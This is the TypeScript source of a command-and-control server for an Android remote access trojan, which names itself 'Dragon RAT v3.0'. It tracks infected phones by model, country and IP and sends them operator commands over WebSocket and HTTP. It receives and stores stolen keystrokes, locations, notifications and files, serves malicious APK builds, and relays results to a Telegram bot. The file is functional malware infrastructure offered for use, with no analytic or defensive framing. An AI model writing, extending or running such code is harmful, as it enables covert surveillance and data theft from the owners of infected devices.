import express from 'express';
import http from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import { config } from './config';
import * as db from './database';
import { startBot, setWSServer, notifyBotOnline, sendResultToAdmin } from './bot';
import { WsMessage, BotInfo } from './types';
import path from 'path';
import fs from 'fs';

// ─── Initialize Database ───
db.initDatabase();

// ─── Express Server ───
const app = express();
const server = http.createServer(app);

app.use(express.json());

// Health endpoint
app.get('/health', (_req, res) => {
    res.json({
        status: 'ok',
        version: '3.0.0',
        bots: db.getBotCount(),
        uptime: process.uptime(),
    });
});

// Bot registration endpoint (HTTP fallback)
app.post('/api/bot/register', (req, res) => {
    const data = req.body;
    const botId = data.id || '';
    if (!botId) {
        return res.status(400).json({ error: 'Bot ID required' });
    }
    db.upsertBot(botId, {
        phoneModel: data.model || '',
        androidVersion: data.android || '',
        sdkLevel: data.sdk || 0,
        country: data.country || '',
        ip: data.ip || req.ip || '',
    });
    res.json({ status: 'registered', bot_id: botId });
});

// Command result submission (HTTP fallback)
app.post('/api/bot/result', (req, res) => {
    const { bot_id, cmd_id, result, success } = req.body;
    if (cmd_id) {
        db.updateCommandStatus(cmd_id, success ? 'completed' : 'failed', result || '');
        sendResultToAdmin(bot_id, cmd_id, result || '', success ?? true);
    }
    res.json({ status: 'received' });
});

// Get pending commands (HTTP fallback)
app.get('/api/bot/:id/pending', (req, res) => {
    const commands = db.getPendingCommands(req.params.id);
    res.json({
        commands: commands.map(c => ({
            id: c.id,
            command: c.command,
            args: JSON.parse(c.args || '{}'),
        })),
    });
});

// APK download endpoint
app.get('/api/builds/:filename', (req, res) => {
    const filepath = path.join(config.buildsDir, req.params.filename);
    if (!fs.existsSync(filepath)) {
        return res.status(404).json({ error: 'File not found' });
    }
    res.download(filepath);
});

// ─── WebSocket Server (for Android bot C2) ───
const wss = new WebSocketServer({ server, path: '/ws' });

const botConnections = new Map<string, WebSocket>(); // botId -> WebSocket
const botInfoMap = new Map<string, BotInfo>();        // botId -> BotInfo

wss.on('connection', (ws: WebSocket, req) => {
    // Extract botId from URL: /ws/{botId}
    const url = req.url || '';
    const botId = url.replace('/ws/', '').split('?')[0];
    if (!botId) {
        ws.close(4000, 'Bot ID required');
        return;
    }

    console.log(`[WS] Bot connected: ${botId.slice(0, 16)}...`);
    botConnections.set(botId, ws);

    // Mark bot online
    const existing = db.getBot(botId);
    if (existing) {
        db.upsertBot(botId, { ...existing });
    }

    const botInfo = db.getBot(botId);
    if (botInfo) {
        botInfoMap.set(botId, botInfo);
        notifyBotOnline(botInfo);
    }

    // Send any pending commands immediately
    const pendingCommands = db.getPendingCommands(botId);
    for (const cmd of pendingCommands) {
        try {
            ws.send(JSON.stringify({
                type: 'command',
                data: {
                    id: cmd.id,
                    command: cmd.command,
                    args: JSON.parse(cmd.args || '{}'),
                },
            }));
            db.updateCommandStatus(cmd.id, 'sent');
        } catch (err) {
            console.error(`[WS] Failed to send command ${cmd.id}:`, err);
        }
    }

    ws.on('message', (rawData) => {
        try {
            const message: WsMessage = JSON.parse(rawData.toString());

            switch (message.type) {
                case 'register':
                    db.upsertBot(botId, {
                        phoneModel: message.data?.model || '',
                        androidVersion: message.data?.android || '',
                        sdkLevel: message.data?.sdk || 0,
                        country: message.data?.country || '',
                        ip: message.data?.ip || req.socket.remoteAddress || '',
                    });
                    const updated = db.getBot(botId);
                    if (updated) {
                        botInfoMap.set(botId, updated);
                        notifyBotOnline(updated);
                    }
                    break;

                case 'result':
                    if (message.cmdId) {
                        db.updateCommandStatus(
                            message.cmdId,
                            message.success ? 'completed' : 'failed',
                            message.result || ''
                        );
                        sendResultToAdmin(botId, message.cmdId, message.result || '', message.success ?? true);
                    }
                    break;

                case 'pong':
                    // Keep-alive response — update last_seen
                    db.upsertBot(botId, { ...(db.getBot(botId) || {}) });
                    if (message.data) {
                        const { battery, charging } = message.data;
                        if (battery !== undefined) {
                            db.updateBotBattery(botId, battery, charging ?? true);
                        }
                    }
                    break;

                case 'exfil':
                    db.storeExfil(botId, message.data?.type || 'unknown', message.result || '', message.data?.filePath || '');
                    break;

                case 'location':
                    db.storeExfil(botId, 'location', message.result || '');
                    break;

                case 'keylog':
                    db.storeExfil(botId, 'keylog', message.result || '');
                    break;

                case 'notification':
                    db.storeExfil(botId, 'notification', message.result || '');
                    break;
            }
        } catch (err) {
            console.error(`[WS] Invalid message from ${botId.slice(0, 16)}:`, err);
        }
    });

    ws.on('close', () => {
        console.log(`[WS] Bot disconnected: ${botId.slice(0, 16)}...`);
        botConnections.delete(botId);
        botInfoMap.delete(botId);
        db.setBotOffline(botId);
    });

    ws.on('error', (err) => {
        console.error(`[WS] Error for ${botId.slice(0, 16)}:`, err.message);
        botConnections.delete(botId);
        botInfoMap.delete(botId);
        db.setBotOffline(botId);
    });
});

// Expose sendToBot function for bot.ts to use
const wsInterface = {
    sendToBot: (botId: string, payload: { id: number; command: string; args: Record<string, any> }): boolean => {
        const ws = botConnections.get(botId);
        if (!ws || ws.readyState !== WebSocket.OPEN) return false;
        try {
            ws.send(JSON.stringify({
                type: 'command',
                data: payload,
            }));
            db.updateCommandStatus(payload.id, 'sent');
            return true;
        } catch {
            return false;
        }
    },
    getConnectedBots: (): string[] => [...botConnections.keys()],
};

setWSServer(wsInterface);

// ─── Heartbeat ───
setInterval(() => {
    for (const [botId, ws] of botConnections.entries()) {
        if (ws.readyState === WebSocket.OPEN) {
            try {
                ws.send(JSON.stringify({ type: 'ping' }));
            } catch {
                botConnections.delete(botId);
                db.setBotOffline(botId);
            }
        } else {
            botConnections.delete(botId);
            db.setBotOffline(botId);
        }
    }
}, 15000);

// ─── Start ───
server.listen(config.port, '0.0.0.0', () => {
    console.log(`[SERVER] Dragon RAT v3.0 running on port ${config.port}`);
    console.log(`[SERVER] WebSocket: ws://0.0.0.0:${config.port}/ws/{botId}`);
    console.log(`[SERVER] Health: http://0.0.0.0:${config.port}/health`);

    // Start Telegram bot after server is ready
    startBot();
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[SERVER] Shutting down...');
    for (const ws of botConnections.values()) {
        try { ws.close(); } catch {}
    }
    db.closeDatabase();
    server.close();
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('[SERVER] Shutting down...');
    for (const ws of botConnections.values()) {
        try { ws.close(); } catch {}
    }
    db.closeDatabase();
    server.close();
    process.exit(0);
});
